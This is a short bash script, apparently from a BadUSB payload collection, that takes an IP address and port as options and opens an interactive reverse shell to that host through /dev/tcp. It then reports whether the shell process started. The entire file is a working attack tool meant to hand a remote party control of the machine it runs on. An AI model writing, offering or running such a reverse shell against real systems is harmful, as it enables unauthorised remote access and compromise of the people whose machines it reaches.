#!/bin/bash

# very similar to mac's revshell but for bash instead of zsh.
# basically copied from my badusb online payload: https://github.com/SkepticSeptic/badUSBonlinePayload/blob/main/revshellMacnLinux.sh

while getopts ":I:P:" opt; do
  case $opt in
    I) IP_ADDRESS="$OPTARG"
    ;;
    P) PORT="$OPTARG"
    ;;
    \?) echo "Invalid option -$OPTARG" >&2
    exit 1
    ;;
  esac
done

echo "Attempting to establish reverse shell on $IP_ADDRESS:$PORT..."

/bin/bash -i >& /dev/tcp/$IP_ADDRESS/$PORT 0>&1 &

# Wait for a brief moment to allow the shell to establish
sleep 1

# Check if the background process (bash -i) is still running
if ps | grep $! > /dev/null; then
    echo "Shell established!"
else
    echo "Failed to establish shell."
fi
